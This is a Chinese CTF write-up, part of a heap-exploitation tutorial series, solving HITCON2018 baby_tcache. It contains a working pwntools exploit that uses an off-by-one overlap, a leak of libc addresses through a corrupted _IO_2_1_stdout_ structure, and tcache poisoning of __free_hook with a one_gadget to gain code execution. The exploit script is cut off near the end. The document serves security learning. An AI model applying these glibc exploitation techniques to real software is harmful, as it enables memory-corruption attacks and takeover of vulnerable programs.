            <h1 id="pwn堆入门系列教程8"><a href="#pwn堆入门系列教程8" class="headerlink" title="pwn堆入门系列教程8"></a>pwn堆入门系列教程8</h1><p><a href="https://xz.aliyun.com/t/6087" target="_blank" rel="noopener">pwn堆入门系列教程1</a><br><a href="https://xz.aliyun.com/t/6169" target="_blank" rel="noopener">pwn堆入门系列教程2</a><br><a href="https://xz.aliyun.com/t/6252" target="_blank" rel="noopener">pwn堆入门系列教程3</a><br><a href="https://xz.aliyun.com/t/6322" target="_blank" rel="noopener">pwn堆入门系列教程4</a><br><a href="https://xz.aliyun.com/t/6377" target="_blank" rel="noopener">pwn堆入门系列教程5</a><br><a href="https://xz.aliyun.com/t/6406" target="_blank" rel="noopener">pwn堆入门系列教程6</a><br><a href="https://xz.aliyun.com/t/6449" target="_blank" rel="noopener">pwn堆入门系列教程7</a></p>
<p>这篇文章感觉算堆又不算堆，因为要结合到IO_FILE攻击部分，而且最主要是IO_FILE的利用，此题又学习到新的东西了，以前只玩过IO_FILE的伪造vtable,这次的leak方法第一次见</p>
<h2 id="HITCON2018-baby-tcache"><a href="#HITCON2018-baby-tcache" class="headerlink" title="HITCON2018 baby_tcache"></a>HITCON2018 baby_tcache</h2><p>这道题我故意将其与tcache中的第一道题分开，因为这道题难度不在于tcache的攻击，而在于IO_FILE的利用，利用上一篇文章中的方法也很容易构造overlap，但libc却无法泄露，我自己纠结好久过后，还是看了wp</p>
<h3 id="功能分析"><a href="#功能分析" class="headerlink" title="功能分析"></a>功能分析</h3><ol>
<li>新建一个堆块，存在off-by-one</li>
<li>删除一个堆块</li>
<li>退出</li>
</ol>
<p>无leak函数</p>
<h3 id="漏洞点分析"><a href="#漏洞点分析" class="headerlink" title="漏洞点分析"></a>漏洞点分析</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">sub_C6B</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  _QWORD *v0; <span class="comment">// rax</span></span><br><span class="line">  <span class="keyword">signed</span> <span class="keyword">int</span> i; <span class="comment">// [rsp+Ch] [rbp-14h]</span></span><br><span class="line">  _BYTE *v3; <span class="comment">// [rsp+10h] [rbp-10h]</span></span><br><span class="line">  <span class="keyword">unsigned</span> __int64 size; <span class="comment">// [rsp+18h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">for</span> ( i = <span class="number">0</span>; ; ++i )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">if</span> ( i &gt; <span class="number">9</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      LODWORD(v0) = <span class="built_in">puts</span>(<span class="string">":("</span>);</span><br><span class="line">      <span class="keyword">return</span> (<span class="keyword">signed</span> <span class="keyword">int</span>)v0;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> ( !qword_202060[i] )</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">"Size:"</span>);</span><br><span class="line">  size = sub_B27();</span><br><span class="line">  <span class="keyword">if</span> ( size &gt; <span class="number">0x2000</span> )</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">-2</span>);</span><br><span class="line">  v3 = <span class="built_in">malloc</span>(size);</span><br><span class="line">  <span class="keyword">if</span> ( !v3 )</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">-1</span>);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">"Data:"</span>);</span><br><span class="line">  sub_B88((__int64)v3, size);</span><br><span class="line">  v3[size] = <span class="number">0</span>;</span><br><span class="line">  qword_202060[i] = v3;</span><br><span class="line">  v0 = qword_2020C0;</span><br><span class="line">  qword_2020C0[i] = size;</span><br><span class="line">  <span class="keyword">return</span> (<span class="keyword">signed</span> <span class="keyword">int</span>)v0;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>漏洞点很明显，off-by-one，在堆块重用机制下，会覆盖到下一个堆快的size部分</p>
<h3 id="漏洞利用过程"><a href="#漏洞利用过程" class="headerlink" title="漏洞利用过程"></a>漏洞利用过程</h3><p>起初自己分析的时候做着做着忘了他没有leak，一股脑构造了个overlap，然后？？？我没有leak咋泄露啊，然后爆炸了，卡了很久都不知道怎么leak<br>看了别人的wp后发觉是利用IO_FILE泄露，以前没有接触过，所以这次记录下</p>
<h4 id="堆操作初始化"><a href="#堆操作初始化" class="headerlink" title="堆操作初始化"></a>堆操作初始化</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"><span class="comment"># coding=utf-8</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">elf = ELF(<span class="string">'./baby_tcache'</span>)</span><br><span class="line">libc = elf.libc</span><br><span class="line">io = process(<span class="string">'./baby_tcache'</span>)</span><br><span class="line">context.log_level = <span class="string">'debug'</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">choice</span><span class="params">(idx)</span>:</span></span><br><span class="line">    io.sendlineafter(<span class="string">"Your choice: "</span>, str(idx))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">new</span><span class="params">(size, content=<span class="string">'a'</span>)</span>:</span></span><br><span class="line">    choice(<span class="number">1</span>)</span><br><span class="line">    io.sendlineafter(<span class="string">"Size:"</span>, str(size))</span><br><span class="line">    io.sendafter(<span class="string">'Data:'</span>, content)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">delete</span><span class="params">(idx)</span>:</span></span><br><span class="line">    choice(<span class="number">2</span>)</span><br><span class="line">    io.sendlineafter(<span class="string">"Index:"</span>, str(idx))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">exit</span><span class="params">()</span>:</span></span><br><span class="line">    choice(<span class="number">3</span>)</span><br></pre></td></tr></table></figure>

<p>这个没啥好讲的，每次都得写</p>
<h4 id="这部分是构造overlap的"><a href="#这部分是构造overlap的" class="headerlink" title="这部分是构造overlap的"></a>这部分是构造overlap的</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">new(<span class="number">0x500</span><span class="number">-0x8</span>) <span class="comment">#0</span></span><br><span class="line">new(<span class="number">0x30</span>) <span class="comment">#1</span></span><br><span class="line">new(<span class="number">0x40</span>) <span class="comment">#2</span></span><br><span class="line">new(<span class="number">0x50</span>) <span class="comment">#3</span></span><br><span class="line">new(<span class="number">0x60</span>) <span class="comment">#4</span></span><br><span class="line">new(<span class="number">0x500</span><span class="number">-0x8</span>) <span class="comment">#5</span></span><br><span class="line">new(<span class="number">0x70</span>) <span class="comment">#6</span></span><br><span class="line">delete(<span class="number">4</span>)</span><br><span class="line">new(<span class="number">0x68</span>, <span class="string">"A"</span>*<span class="number">0x60</span> + <span class="string">'\x60\x06'</span>)</span><br><span class="line">delete(<span class="number">2</span>)</span><br><span class="line">delete(<span class="number">0</span>)</span><br><span class="line">delete(<span class="number">5</span>)</span><br></pre></td></tr></table></figure>

<p>前面学过chunk extend部分，这部分应该很好理解，至于那里为什么是\x60\x06</p>
<blockquote>
<blockquote>
<blockquote>
<p>hex(0x500+0x30+0x40+0x50+0x60+0x40)<br>‘0x660’</p>
</blockquote>
</blockquote>
</blockquote>
<p>注意0x500这部分包括chunk的pre_size和size部分</p>
<p>计算的时候要算上chunk头部大小</p>
<h4 id="leak-libc-重点"><a href="#leak-libc-重点" class="headerlink" title="leak libc(重点)"></a>leak libc(重点)</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">new(<span class="number">0x530</span>)</span><br><span class="line">delete(<span class="number">4</span>)</span><br><span class="line">new(<span class="number">0xa0</span>, <span class="string">'\x60\x07'</span>)</span><br><span class="line">new(<span class="number">0x40</span>, <span class="string">'a'</span>)</span><br><span class="line">new(<span class="number">0x3e</span>, p64(<span class="number">0xfbad1800</span>)+ p64(<span class="number">0</span>)*<span class="number">3</span> + <span class="string">'\x00'</span>)</span><br><span class="line">print(repr(io.recv(<span class="number">8</span>)))</span><br><span class="line">print(<span class="string">'leak!!!!!'</span>)</span><br><span class="line">info1 = io.recv(<span class="number">8</span>)</span><br><span class="line">print(repr(info1))</span><br><span class="line">leak_libc = u64(info1)</span><br><span class="line">io.success(<span class="string">"leak_libc: 0x%x"</span> % leak_libc)</span><br><span class="line">libc_base = leak_libc - <span class="number">0x3ed8b0</span></span><br></pre></td></tr></table></figure>

<ol>
<li>我们要将unsortbin移动到chunk2部分，所以总大小为0x500+0x30+0x10=0x540，所以malloc是0x530</li>
<li>delete(4)为了后面做准备</li>
<li>接下来要覆盖的后三位是0x760，这是不会改的，内存一个页是0x1000，后三位是固定的，所以需要爆破高位，我们爆破猜测为0，所以是0x0760，这里是chunk2的数据部分，本来是main_arena的数据的，现在修改他的低两个字节,需要改成<em>IO_2_1_stdout</em></li>
<li>tcache poisoning攻击</li>
<li>这里的为什么是fbad1800?以及0x3e大小，还有p64(0)如何来的？</li>
</ol>
<p>引用ctf-wiki</p>
<p>最终会调用到这部分代码</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">int</span></span><br><span class="line">_IO_new_file_overflow (_IO_FILE *f, <span class="keyword">int</span> ch)</span><br><span class="line">&#123;</span><br><span class="line">  <span class="keyword">if</span> (f-&gt;_flags &amp; _IO_NO_WRITES)  </span><br><span class="line">    &#123;</span><br><span class="line">      f-&gt;_flags |= _IO_ERR_SEEN;</span><br><span class="line">      __set_errno (EBADF);</span><br><span class="line">      <span class="keyword">return</span> EOF;</span><br><span class="line">    &#125;</span><br><span class="line">  <span class="comment">/* If currently reading or no buffer allocated. */</span></span><br><span class="line">  <span class="keyword">if</span> ((f-&gt;_flags &amp; _IO_CURRENTLY_PUTTING) == <span class="number">0</span> || f-&gt;_IO_write_base == <span class="literal">NULL</span>) </span><br><span class="line">    &#123;</span><br><span class="line">      :</span><br><span class="line">      :</span><br><span class="line">    &#125;</span><br><span class="line">  <span class="keyword">if</span> (ch == EOF)</span><br><span class="line">    <span class="keyword">return</span> _IO_do_write (f, f-&gt;_IO_write_base,  <span class="comment">// 需要调用的目标，如果使得 _IO_write_base &lt; _IO_write_ptr，且 _IO_write_base 处</span></span><br><span class="line">                                                <span class="comment">// 存在有价值的地址 （libc 地址）则可进行泄露</span></span><br><span class="line">                                                <span class="comment">// 在正常情况下，_IO_write_base == _IO_write_ptr 且位于 libc 中，所以可进行部分写</span></span><br><span class="line">             f-&gt;_IO_write_ptr - f-&gt;_IO_write_base);</span><br></pre></td></tr></table></figure>

<p>下面会以_IO_do_write相同的参数调用new_do_write</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">static</span></span><br><span class="line">_IO_size_t</span><br><span class="line">new_do_write (_IO_FILE *fp, <span class="keyword">const</span> <span class="keyword">char</span> *data, _IO_size_t to_do)</span><br><span class="line">&#123;</span><br><span class="line">  _IO_size_t count;</span><br><span class="line">  <span class="keyword">if</span> (fp-&gt;_flags &amp; _IO_IS_APPENDING)  <span class="comment">/* 需要满足 */</span></span><br><span class="line">    <span class="comment">/* On a system without a proper O_APPEND implementation,</span></span><br><span class="line"><span class="comment">       you would need to sys_seek(0, SEEK_END) here, but is</span></span><br><span class="line"><span class="comment">       not needed nor desirable for Unix- or Posix-like systems.</span></span><br><span class="line"><span class="comment">       Instead, just indicate that offset (before and after) is</span></span><br><span class="line"><span class="comment">       unpredictable. */</span></span><br><span class="line">    fp-&gt;_offset = _IO_pos_BAD;</span><br><span class="line">  <span class="keyword">else</span> <span class="keyword">if</span> (fp-&gt;_IO_read_end != fp-&gt;_IO_write_base)</span><br><span class="line">    &#123;</span><br><span class="line">     ............</span><br><span class="line">    &#125;</span><br><span class="line">  count = _IO_SYSWRITE (fp, data, to_do); <span class="comment">// 这里真正进行 write</span></span><br></pre></td></tr></table></figure>

<p>我们目的是调用到_IO_SYSWRITE，所以要bypass前面的检查，结合起来</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">_flags = <span class="number">0xfbad0000</span>  <span class="comment">// Magic number</span></span><br><span class="line">_flags &amp; = ~_IO_NO_WRITES <span class="comment">// _flags = 0xfbad0000</span></span><br><span class="line">_flags | = _IO_CURRENTLY_PUTTING <span class="comment">// _flags = 0xfbad0800</span></span><br><span class="line">_flags | = _IO_IS_APPENDING <span class="comment">// _flags = 0xfbad1800</span></span><br></pre></td></tr></table></figure>

<p>上面这部分ctf-wiki讲过了不在重复叙述，我当初纠结的是puts究竟是如何泄露libc的，<br>我们要用的是_IO_SYSWRITE(fp, data, to_do)<br>这个函数最终对应到函数 write(fp-&gt;fileno, data, to_do)<br>程序执行到这里就会输出 f-&gt;_IO_write_base中的数据，而这些数据里面，就会存在固定的libc中的地址。</p>
<p>这部分过程建议读读这篇文章，当输出缓冲区还没有满时，会将即将打印的字符串复制到输出缓冲区中，填满输出缓冲区。然后调用_IO_new_file_overflow刷新输出缓冲区</p>
<p><a href="http://dittozzz.top/2019/04/24/IO-FILE部分源码分析及利用/" target="_blank" rel="noopener">IO-FILE部分源码分析及利用</a></p>
<p>所以会泄露出部分数据，逆着推导我们需要执行到这个函数，就需要bypass前面的检查</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (ch == EOF)</span><br><span class="line">  <span class="keyword">return</span> _IO_do_write (f, f-&gt;_IO_write_base,  <span class="comment">// 需要调用的目标，如果使得 _IO_write_base &lt; _IO_write_ptr，且 _IO_write_base 处</span></span><br><span class="line">                                              <span class="comment">// 存在有价值的地址 （libc 地址）则可进行泄露</span></span><br><span class="line">                                              <span class="comment">// 在正常情况下，_IO_write_base == _IO_write_ptr 且位于 libc 中，所以可进行部分写</span></span><br><span class="line">           f-&gt;_IO_write_ptr - f-&gt;_IO_write_base);</span><br></pre></td></tr></table></figure>

<p>这里我们将_IO_write_base最低覆盖成0了，所以他大部分情况下比_IO_write_ptr小，所以to_do的大小就变成相对可控了</p>
<p>在逆向回去就是flag检查</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">define</span> _IO_NO_WRITES 0x0008</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> _IO_CURRENTLY_PUTTING 0x0800</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> _IO_IS_APPENDING 0x1000</span></span><br><span class="line"></span><br><span class="line">_flags = <span class="number">0xfbad0000</span>	<span class="comment">//高两个字节是magic不用管</span></span><br><span class="line">_flags &amp; = _IO_NO_WRITES = <span class="number">0</span></span><br><span class="line">_flags &amp; _IO_CURRENTLY_PUTTING = <span class="number">1</span></span><br><span class="line">_flags &amp; _IO_IS_APPENDING = <span class="number">1</span></span><br><span class="line"></span><br><span class="line">所以_flag的值为<span class="number">0x0</span>xfbad18*<span class="number">0</span>  *可以为任何数</span><br></pre></td></tr></table></figure>

<p>其实魔数部分改成什么都可以</p>
<p>原理讲通后就是测试了</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> _<span class="title">IO_FILE</span> &#123;</span></span><br><span class="line">  <span class="keyword">int</span> _flags;       <span class="comment">/* High-order word is _IO_MAGIC; rest is flags. */</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> _IO_file_flags _flags</span></span><br><span class="line"></span><br><span class="line">  <span class="comment">/* The following pointers correspond to the C++ streambuf protocol. */</span></span><br><span class="line">  <span class="comment">/* Note:  Tk uses the _IO_read_ptr and _IO_read_end fields directly. */</span></span><br><span class="line">  <span class="keyword">char</span>* _IO_read_ptr;   <span class="comment">/* Current read pointer */</span></span><br><span class="line">  <span class="keyword">char</span>* _IO_read_end;   <span class="comment">/* End of get area. */</span></span><br><span class="line">  <span class="keyword">char</span>* _IO_read_base;  <span class="comment">/* Start of putback+get area. */</span></span><br><span class="line">  <span class="keyword">char</span>* _IO_write_base; <span class="comment">/* Start of put area. */</span></span><br><span class="line">  <span class="keyword">char</span>* _IO_write_ptr;  <span class="comment">/* Current put pointer. */</span></span><br><span class="line">  <span class="keyword">char</span>* _IO_write_end;  <span class="comment">/* End of put area. */</span></span><br><span class="line">  <span class="keyword">char</span>* _IO_buf_base;   <span class="comment">/* Start of reserve area. */</span></span><br><span class="line">  <span class="keyword">char</span>* _IO_buf_end;    <span class="comment">/* End of reserve area. */</span></span><br><span class="line">  <span class="comment">/* The following fields are used to support backing up and undo. */</span></span><br><span class="line">  <span class="keyword">char</span> *_IO_save_base; <span class="comment">/* Pointer to start of non-current get area. */</span></span><br><span class="line">  <span class="keyword">char</span> *_IO_backup_base;  <span class="comment">/* Pointer to first valid character of backup area */</span></span><br><span class="line">  <span class="keyword">char</span> *_IO_save_end; <span class="comment">/* Pointer to end of non-current get area. */</span></span><br><span class="line"></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> _<span class="title">IO_marker</span> *_<span class="title">markers</span>;</span></span><br><span class="line"></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> _<span class="title">IO_FILE</span> *_<span class="title">chain</span>;</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">int</span> _fileno;</span><br><span class="line"><span class="meta">#<span class="meta-keyword">if</span> 0</span></span><br><span class="line">  <span class="keyword">int</span> _blksize;</span><br><span class="line"><span class="meta">#<span class="meta-keyword">else</span></span></span><br><span class="line">  <span class="keyword">int</span> _flags2;</span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line">  _IO_off_t _old_offset; <span class="comment">/* This used to be _offset but it's too small.  */</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> __HAVE_COLUMN <span class="comment">/* temporary */</span></span></span><br><span class="line">  <span class="comment">/* 1+column number of pbase(); 0 is unknown. */</span></span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">short</span> _cur_column;</span><br><span class="line">  <span class="keyword">signed</span> <span class="keyword">char</span> _vtable_offset;</span><br><span class="line">  <span class="keyword">char</span> _shortbuf[<span class="number">1</span>];</span><br><span class="line"></span><br><span class="line">  <span class="comment">/*  char* _save_gptr;  char* _save_egptr; */</span></span><br><span class="line"></span><br><span class="line">  _IO_lock_t *_lock;</span><br><span class="line"><span class="meta">#<span class="meta-keyword">ifdef</span> _IO_USE_OLD_IO_FILE</span></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>

<p>这里就是覆盖_IO_FILE的结构体了，fbad1800是flags，fbad是魔数，<br>后面接下来三个p64(0)覆盖</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">char</span>* _IO_read_ptr;   <span class="comment">/* Current read pointer */</span></span><br><span class="line"><span class="keyword">char</span>* _IO_read_end;   <span class="comment">/* End of get area. */</span></span><br><span class="line"><span class="keyword">char</span>* _IO_read_base;  <span class="comment">/* Start of putback+get area. */</span></span><br></pre></td></tr></table></figure>

<p>最后覆盖一个低字节\x00到_IO_write_base，效果如下</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">gdb-peda$ x/20gx 0x7f00898f0760</span><br><span class="line">0x7f00898f0760 &lt;_IO_2_1_stdout_&gt;:	0x00000000fbad1800	0x0000000000000000</span><br><span class="line">0x7f00898f0770 &lt;_IO_2_1_stdout_+16&gt;:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x7f00898f0780 &lt;_IO_2_1_stdout_+32&gt;:	0x00007f00898f0700	0x00007f00898f07e3</span><br><span class="line">0x7f00898f0790 &lt;_IO_2_1_stdout_+48&gt;:	0x00007f00898f07e3	0x00007f00898f07e3</span><br><span class="line">0x7f00898f07a0 &lt;_IO_2_1_stdout_+64&gt;:	0x00007f00898f07e4	0x0000000000000000</span><br><span class="line">0x7f00898f07b0 &lt;_IO_2_1_stdout_+80&gt;:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x7f00898f07c0 &lt;_IO_2_1_stdout_+96&gt;:	0x0000000000000000	0x00007f00898efa00</span><br><span class="line">0x7f00898f07d0 &lt;_IO_2_1_stdout_+112&gt;:	0x0000000000000001	0xffffffffffffffff</span><br><span class="line">0x7f00898f07e0 &lt;_IO_2_1_stdout_+128&gt;:	0x000000000a000000	0x00007f00898f18c0</span><br><span class="line">0x7f00898f07f0 &lt;_IO_2_1_stdout_+144&gt;:	0xffffffffffffffff	0x0000000000000000</span><br><span class="line">gdb-peda$ x/10gx 0x00007f00898f0700</span><br><span class="line">0x7f00898f0700 &lt;_IO_2_1_stderr_+128&gt;:	0x0000000000000000	0x00007f00898f18b0</span><br><span class="line">0x7f00898f0710 &lt;_IO_2_1_stderr_+144&gt;:	0xffffffffffffffff	0x0000000000000000</span><br><span class="line">0x7f00898f0720 &lt;_IO_2_1_stderr_+160&gt;:	0x00007f00898ef780	0x0000000000000000</span><br><span class="line">0x7f00898f0730 &lt;_IO_2_1_stderr_+176&gt;:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x7f00898f0740 &lt;_IO_2_1_stderr_+192&gt;:	0x0000000000000000	0x0000000000000000</span><br></pre></td></tr></table></figure>

<p>所以可以泄露出libc地址了</p>
<h4 id="tcache-poisoning攻击"><a href="#tcache-poisoning攻击" class="headerlink" title="tcache poisoning攻击"></a>tcache poisoning攻击</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">new(<span class="number">0xa0</span>, p64(libc_base + libc.symbols[<span class="string">'__free_hook'</span>]))</span><br><span class="line">new(<span class="number">0x60</span>, <span class="string">"A"</span>)</span><br><span class="line"><span class="comment">#gdb.attach(io)</span></span><br><span class="line"><span class="comment">#one_gadget = 0x4f2c5 #</span></span><br><span class="line">one_gadget = <span class="number">0x4f322</span> <span class="comment">#0x10a38c</span></span><br><span class="line">new(<span class="number">0x60</span>, p64(libc_base + one_gadget))</span><br><span class="line">delete(<span class="number">0</span>)</span><br></pre></td></tr></table></figure>



<h3 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"><span class="comment"># coding=utf-8</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">elf = ELF(<span class="string">'./baby_tcache'</span>)</span><br><span class="line">libc = elf.libc</span><br><span class="line">io = process(<span class="string">'./baby_tcache'</span>)</span><br><span class="line">context.log_level = <span class="string">'debug'</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">choice</span><span class="params">(idx)</span>:</span></span><br><span class="line">    io.sendlineafter(<span class="string">"Your choice: "</span>, str(idx))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">new</span><span class="params">(size, content=<span class="string">'a'</span>)</span>:</span></span><br><span class="line">    choice(<span class="number">1</span>)</span><br><span class="line">    io.sendlineafter(<span class="string">"Size:"</span>, str(size))</span><br><span class="line">    io.sendafter(<span class="string">'Data:'</span>, content)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">delete</span><span class="params">(idx)</span>:</span></span><br><span class="line">    choice(<span class="number">2</span>)</span><br><span class="line">    io.sendlineafter(<span class="string">"Index:"</span>, str(idx))</span><br><span class="line"></span><br><span class="line"><span class="function"><span 